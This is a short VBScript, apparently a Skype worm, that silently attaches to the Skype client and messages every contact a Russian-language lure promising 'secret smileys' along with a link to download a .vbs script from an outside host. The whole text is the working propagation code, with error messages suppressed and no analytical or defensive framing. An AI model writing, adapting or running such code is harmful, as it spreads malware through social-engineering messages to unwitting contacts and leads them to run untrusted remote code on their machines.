on error resume next
set Skype = Wscript.CreateObject("Skype4COM.Skype", "Skype ")
Skype.Client.Start()
Skype.Attach()
For Each User In Skype.Friends
Skype.SendMessage User.handle," Привет!!!"
Skype.SendMessage User.handle,"Хочешь такие секретные смайлы как (drunk) (rock) (finger) (mooning)(bug)(poolparty) и другие!? Тогда скачай их себе, по адресу ниже!!!" 
Skype.SendMessage User.handle,"http://mew.ucoz.ru/smilles.vbs"

next
